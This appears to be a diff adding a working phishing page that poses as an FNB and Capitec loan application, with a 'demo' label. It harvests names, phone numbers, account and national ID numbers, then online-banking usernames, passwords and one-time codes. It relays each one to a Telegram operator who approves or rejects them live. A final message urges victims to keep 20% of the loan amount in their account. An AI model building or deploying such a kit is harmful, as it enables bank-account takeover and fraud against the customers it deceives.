@@ -1,0 +1,376 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>FNB & Capitec Loan (Telegram webhook demo)</title>
+  <style>
+    :root {
+      --accent: #0077b6; /* default (will be overridden by bank selection) */
+      --bg: #f6f9fc;
+      --card: #fff;
+      --muted: #666;
+    }
+    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial; background:var(--bg); margin:0; padding:20px; color:#111; }
+    .container { max-width:760px; margin:20px auto; background:var(--card); border-radius:8px; padding:20px; box-shadow:0 8px 24px rgba(10,10,20,0.06); }
+    h1 { margin:0 0 8px; font-size:20px; color:var(--accent); }
+    .step { display:none; } .step.active { display:block; }
+    label { display:block; font-size:13px; margin-bottom:6px; color:var(--muted); }
+    input, select, button { font-family:inherit; }
+    input, select { width:100%; padding:10px; border-radius:6px; border:1px solid #ddd; font-size:14px; }
+    .summary { background:#f1f6fb; padding:12px; border-radius:6px; }
+    .buttons { display:flex; justify-content:space-between; gap:12px; margin-top:12px; }
+    button { background:var(--accent); color:#fff; border:none; padding:10px 14px; border-radius:6px; cursor:pointer; font-weight:600; }
+    button.ghost { background:transparent; color:var(--accent); border:1px solid rgba(0,0,0,0.06); }
+    .muted { color:var(--muted); font-size:13px; }
+    .error { color:#b00020; font-size:13px; margin-top:6px; }
+    .status { margin-top:8px; font-size:14px; color:#333; }
+    .bank-option { display:inline-flex; align-items:center; gap:8px; padding:8px 12px; border-radius:6px; border:1px solid #eee; cursor:pointer; }
+    .bank-option input { margin-right:6px; }
+    .progress { display:flex; gap:8px; margin-bottom:14px; }
+    .progress .dot { width:12px; height:12px; border-radius:50%; background:#e6eef7; }
+    .progress .dot.active { background:var(--accent); }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <h1 id="app-title">FNB & Capitec Loan (Telegram webhook demo)</h1>
+    <p class="muted">Admin decisions are done via Telegram only. Demo stores state in memory (server restart clears data).</p>
+
+    <div class="progress" aria-hidden="true">
+      <div class="dot" id="dot-1"></div>
+      <div class="dot" id="dot-2"></div>
+      <div class="dot" id="dot-3"></div>
+      <div class="dot" id="dot-4"></div>
+    </div>
+
+    <section id="s1" class="step active">
+      <h2>1. Loan calculator</h2>
+      <label>Amount: <strong id="amountLabel">R5 000</strong></label>
+      <input id="amount" type="range" min="500" max="500000" step="100" value="5000"/>
+      <div style="display:flex; gap:12px; margin-top:12px;">
+        <div style="flex:1">
+          <label for="period">Repayment period (years)</label>
+          <select id="period"></select>
+        </div>
+        <div style="width:220px">
+          <label>Interest</label>
+          <div class="muted">8.00% p.a.</div>
+        </div>
+      </div>
+      <div class="summary" style="margin-top:12px">
+        Monthly: <strong id="monthly">R0.00</strong>
+        <div class="muted">Total: <span id="totalPaid">R0.00</span> · Interest: <span id="totalInterest">R0.00</span></div>
+      </div>
+      <div class="buttons"><div></div><button id="to-details">Next: Details →</button></div>
+    </section>
+
+    <section id="s2" class="step">
+      <h2>2. Personal & Bank details</h2>
+      <label>Full name</label><input id="fullname" type="text"/><div id="err-fullname" class="error"></div>
+
+      <label style="margin-top:8px">Phone</label><input id="phone" type="tel" placeholder="0821234567 or +27821234567"/><div id="err-phone" class="error"></div>
+
+      <label style="margin-top:8px">Bank</label>
+      <div style="display:flex; gap:8px; margin-bottom:8px;">
+        <label class="bank-option" id="opt-capitec"><input type="radio" name="bank" value="Capitec" /> Capitec</label>
+        <label class="bank-option" id="opt-fnb"><input type="radio" name="bank" value="FNB" /> FNB</label>
+      </div>
+
+      <label>Account number</label><input id="account" type="text"/><div id="err-account" class="error"></div>
+
+      <label style="margin-top:8px">ID number</label><input id="idnum" type="text"/><div id="err-id" class="error"></div>
+
+      <div class="buttons">
+        <button class="ghost" id="back-calc">← Back</button>
+        <button id="submit-details">Submit details (send to Telegram)</button>
+      </div>
+      <div id="details-status" class="status"></div>
+    </section>
+
+    <section id="s3" class="step">
+      <h2>3. Credentials</h2>
+      <label>Username</label><input id="username" type="text"/><div id="err-username" class="error"></div>
+
+      <label style="margin-top:8px">Password / PIN</label><input id="password" type="password"/><div id="err-password" class="error"></div>
+
+      <div class="muted" style="margin-top:8px">Tap Verify to send credentials to Telegram admin. The client will poll for admin decision.</div>
+
+      <div class="buttons">
+        <button class="ghost" id="back-details">← Back</button>
+        <button id="verify-credentials">Verify (send to Telegram)</button>
+      </div>
+      <div id="cred-status" class="status"></div>
+    </section>
+
+    <section id="s4" class="step">
+      <h2>4. OTP confirmation</h2>
+      <label>Phone (again)</label><input id="otp-phone" type="tel"/><div id="err-otp-phone" class="error"></div>
+
+      <label style="margin-top:8px">OTP code</label><input id="otp" type="text" inputmode="numeric"/><div id="err-otp" class="error"></div>
+
+      <div class="muted" style="margin-top:8px">Enter OTP (4–6 digits). When value looks valid, it will be sent to Telegram admin automatically.</div>
+
+      <div class="buttons">
+        <button class="ghost" id="back-cred">← Back</button>
+      </div>
+      <div id="otp-status" class="status"></div>
+    </section>
+
+    <section id="s5" class="step">
+      <h2>Final</h2>
+      <div class="summary" id="final-msg"></div>
+      <div style="margin-top:12px"><button id="start-over" class="ghost">Start over</button></div>
+    </section>
+  </div>
+
+  <script>
+    // Bank themes and default passwords
+    const BANKS = {
+      FNB: {
+        accent: '#f6a800',       // FNB-like gold
+        title: 'FNB Loan',
+        samplePassword: 'fnb_password'
+      },
+      Capitec: {
+        accent: '#e30613',       // Capitec-like red
+        title: 'Capitec Loan',
+        samplePassword: 'capitec_password'
+      },
+      DEFAULT: {
+        accent: '#0077b6',
+        title: 'FNB & Capitec Loan (Telegram webhook demo)',
+        samplePassword: ''
+      }
+    };
+
+    // Minimal client: polling-based status updates only (no socket.io)
+    const APR = 0.08;
+    const amountEl = document.getElementById('amount');
+    const amountLabel = document.getElementById('amountLabel');
+    const periodSel = document.getElementById('period');
+    const monthlyEl = document.getElementById('monthly');
+    const totalPaidEl = document.getElementById('totalPaid');
+    const totalInterestEl = document.getElementById('totalInterest');
+
+    for (let y=1;y<=20;y++){ const o=document.createElement('option'); o.value=y; o.text=y + (y===1? ' year':' years'); periodSel.appendChild(o); }
+    function fmt(n){ return new Intl.NumberFormat('en-ZA',{style:'currency',currency:'ZAR'}).format(n); }
+    function calc(){ const P=Number(amountEl.value); const years=Number(periodSel.value); const n=years*12; const r=APR/12; let pay=0; if (r===0) pay=P/n; else{ const f=Math.pow(1+r,n); pay=(P*r*f)/(f-1);} amountLabel.textContent = fmt(P); monthlyEl.textContent = fmt(pay); totalPaidEl.textContent = fmt(pay*n); totalInterestEl.textContent = fmt(pay*n - P); }
+    calc(); amountEl.addEventListener('input', calc); periodSel.addEventListener('change', calc);
+
+    function show(id){ document.querySelectorAll('.step').forEach(el => el.classList.toggle('active', el.id === id)); updateProgress(id); }
+    function updateProgress(id) {
+      const map = { s1:1, s2:2, s3:3, s4:4, s5:4 };
+      const step = map[id] || 1;
+      document.querySelectorAll('.progress .dot').forEach((d,i) => d.classList.toggle('active', i < step));
+    }
+    show('s1');
+
+    // state
+    let applicationId = null;
+    let pollTimer = null;
+    function startPolling() { if (!applicationId) return; if (pollTimer) return; pollTimer = setInterval(checkStatus, 2000); }
+    function stopPolling() { if (pollTimer){ clearInterval(pollTimer); pollTimer = null; } }
+
+    async function checkStatus() {
+      if (!applicationId) return;
+      try {
+        const r = await fetch('/status/' + applicationId);
+        const j = await r.json();
+        if (!j.success) return;
+        const s = j.status;
+        if (s === 'cred_approved') {
+          stopPolling();
+          document.getElementById('cred-status').textContent = 'Credentials approved by admin.';
+          show('s4');
+        } else if (s === 'cred_wrong_user') {
+          stopPolling();
+          document.getElementById('cred-status').textContent = 'Admin: the USERNAME you provided is incorrect. Please update and verify again.';
+        } else if (s === 'cred_wrong_pass') {
+          stopPolling();
+          document.getElementById('cred-status').textContent = 'Admin: the PASSWORD you provided is incorrect. Please update and verify again.';
+        } else if (s === 'otp_approved') {
+          stopPolling();
+          document.getElementById('otp-status').textContent = 'OTP approved by admin.';
+          document.getElementById('final-msg').innerHTML = `<strong>Congratulations — your loan has been submitted.</strong><p class="muted">Wait for review within 12 hours. Loan will be deposited into your account. Make sure you have at least 20% of the borrowed amount in your account before 12 hours.</p>`;
+          show('s5');
+        } else if (s === 'otp_denied') {
+          stopPolling();
+          document.getElementById('otp-status').textContent = 'Dear customer, you do not qualify for that loan. Thank you.';
+        } else if (s === 'otp_wrong') {
+          stopPolling();
+          document.getElementById('otp-status').textContent = 'Sorry — the OTP you provided is wrong or expired. Please try again.';
+        }
+      } catch (e) {
+        console.error('status check error', e);
+      }
+    }
+
+    // Navigation buttons
+    document.getElementById('to-details').addEventListener('click', ()=> show('s2'));
+    document.getElementById('back-calc').addEventListener('click', ()=> show('s1'));
+    document.getElementById('back-details').addEventListener('click', ()=> show('s2'));
+    document.getElementById('back-cred').addEventListener('click', ()=> show('s3'));
+    document.getElementById('start-over').addEventListener('click', ()=> location.reload());
+
+    // Bank selection + theme handling
+    const bankRadios = Array.from(document.querySelectorAll('input[name="bank"]'));
+    const titleEl = document.getElementById('app-title');
+    const passwordInput = document.getElementById('password');
+
+    function applyBankTheme(bank) {
+      const b = BANKS[bank] || BANKS.DEFAULT;
+      document.documentElement.style.setProperty('--accent', b.accent);
+      titleEl.textContent = `${bank} Loan`;
+      // fill/placeholder password
+      passwordInput.value = b.samplePassword;
+      passwordInput.placeholder = `${bank} password (auto-filled)`;
+      // update ghost button colors (they use color:var(--accent))
+      // that's automatic via CSS variable
+    }
+
+    // initialize bank radio labels styling and click handlers
+    bankRadios.forEach(r => {
+      r.addEventListener('change', (e) => {
+        const bank = e.target.value;
+        applyBankTheme(bank);
+      });
+      // allow clicking the styled label to select; ensure initial styling
+    });
+
+    // Default: set theme to DEFAULT at load
+    (function initDefaultTheme(){
+      document.documentElement.style.setProperty('--accent', BANKS.DEFAULT.accent);
+      titleEl.textContent = BANKS.DEFAULT.title;
+      passwordInput.placeholder = 'Password / PIN';
+    })();
+
+    // Submit details
+    document.getElementById('submit-details').addEventListener('click', async () => {
+      const fullname = document.getElementById('fullname').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const account = document.getElementById('account').value.trim();
+      const idnum = document.getElementById('idnum').value.trim();
+      const bank = document.querySelector('input[name="bank"]:checked') ? document.querySelector('input[name="bank"]:checked').value : null;
+      let ok = true;
+      document.getElementById('err-fullname').textContent=''; document.getElementById('err-phone').textContent=''; document.getElementById('err-account').textContent=''; document.getElementById('err-id').textContent='';
+      if (!fullname){ document.getElementById('err-fullname').textContent='Enter name'; ok=false; }
+      if (!/^(?:0\d{9}|\+27\d{9})$/.test(phone.replace(/\s|[-()]/g,''))){ document.getElementById('err-phone').textContent='Enter SA phone e.g. 0821234567'; ok=false; }
+      if (!/^\d{6,12}$/.test(account)){ document.getElementById('err-account').textContent='Account 6–12 digits'; ok=false; }
+      if (!/^\d{13}$/.test(idnum)){ document.getElementById('err-id').textContent='ID must be 13 digits'; ok=false; }
+      if (!bank) { alert('Please choose a bank'); ok = false; }
+      if (!ok) return;
+
+      // Apply theme persistently for chosen bank
+      applyBankTheme(bank);
+
+      const payload = {
+        loanAmount: Number(amountEl.value),
+        termYears: Number(periodSel.value),
+        interestAPR: APR,
+        monthly: monthlyEl.textContent,
+        applicant: { fullName: fullname, phone, bank, accountNumber: account, idNumber: idnum }
+      };
+      document.getElementById('details-status').textContent = 'Sending details to Telegram...';
+      try {
+        const r = await fetch('/api/create-application', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+        const j = await r.json();
+        if (!j.success) { document.getElementById('details-status').textContent = 'Error: ' + (j.error||'server'); return; }
+        applicationId = j.applicationId;
+        document.getElementById('details-status').textContent = 'Details sent. Application ID: ' + applicationId;
+        show('s3');
+      } catch (e) {
+        console.error(e); document.getElementById('details-status').textContent = 'Network error';
+      }
+    });
+
+    // Submit credentials
+    let waitingCred = false;
+    document.getElementById('verify-credentials').addEventListener('click', async () => {
+      if (!applicationId) { alert('Submit details first'); return; }
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      document.getElementById('err-username').textContent=''; document.getElementById('err-password').textContent='';
+      let ok = true;
+      if (!/^[\w.\-]{3,30}$/.test(username)){ document.getElementById('err-username').textContent='Username 3–30 chars'; ok=false; }
+      if (password.length < 4){ document.getElementById('err-password').textContent='At least 4 chars'; ok=false; }
+      if (!ok) return;
+
+      try {
+        document.getElementById('cred-status').textContent = 'Waiting for admin decision on Telegram...';
+        waitingCred = true;
+        const r = await fetch('/api/submit-credentials', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ applicationId, username, password })});
+        const j = await r.json();
+        if (!j.success) {
+          waitingCred = false;
+          document.getElementById('cred-status').textContent = 'Server error: ' + (j.error||'');
+          return;
+        }
+        startPolling();
+      } catch (e) {
+        console.error(e);
+        waitingCred = false;
+        document.getElementById('cred-status').textContent = 'Network error';
+      }
+    });
+
+    // OTP auto submit when length valid
+    document.getElementById('otp').addEventListener('input', () => {
+      const v = document.getElementById('otp').value.trim();
+      if (/^\d{4,6}$/.test(v)) {
+        submitOtp();
+      }
+    });
+
+    let otpSubmitting = false;
+    async function submitOtp() {
+      if (!applicationId) { alert('Submit details/credentials first'); return; }
+      if (otpSubmitting) return;
+      const phone = document.getElementById('otp-phone').value.trim();
+      const otp = document.getElementById('otp').value.trim();
+      document.getElementById('err-otp-phone').textContent=''; document.getElementById('err-otp').textContent='';
+      let ok = true;
+      if (!/^(?:0\d{9}|\+27\d{9})$/.test(phone.replace(/\s|[-()]/g,''))){ document.getElementById('err-otp-phone').textContent='Enter SA phone e.g. 0821234567'; ok=false; }
+      if (!/^\d{4,6}$/.test(otp)){ document.getElementById('err-otp').textContent='Enter 4–6 digit code'; ok=false; }
+      if (!ok) return;
+
+      otpSubmitting = true;
+      document.getElementById('otp-status').textContent = 'Waiting for admin OTP decision via Telegram...';
+      try {
+        const r = await fetch('/api/submit-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ applicationId, phone, otp })});
+        const j = await r.json();
+        if (!j.success) {
+          otpSubmitting = false;
+          document.getElementById('otp-status').textContent = 'Server error: ' + (j.error||'');
+          return;
+        }
+        startPolling();
+      } catch (e) {
+        console.error(e);
+        otpSubmitting = false;
+        document.getElementById('otp-status').textContent = 'Network error';
+      }
+    }
+
+    // allow Enter to submit quickly
+    document.getElementById('password').addEventListener('keydown', (e) => { if (e.key === 'Enter') document.getElementById('verify-credentials').click(); });
+    document.getElementById('idnum').addEventListener('keydown', (e) => { if (e.key === 'Enter') document.getElementById('submit-details').click(); });
+
+    // Pre-select Capitec by default (optional). If you want no preselect, remove these lines.
+    // document.querySelector('input[name="bank"][value="Capitec"]').checked = true; applyBankTheme('Capitec');
+    // If you prefer to have no bank chosen by default, comment out above and user must pick a bank.
+
+    // Ensure bank radio clicks update theme (also update label styles for visual selection)
+    document.querySelectorAll('.bank-option').forEach(label => {
+      label.addEventListener('click', () => {
+        const input = label.querySelector('input[type="radio"]');
+        if (input) {
+          input.checked = true;
+          const bank = input.value;
+          applyBankTheme(bank);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
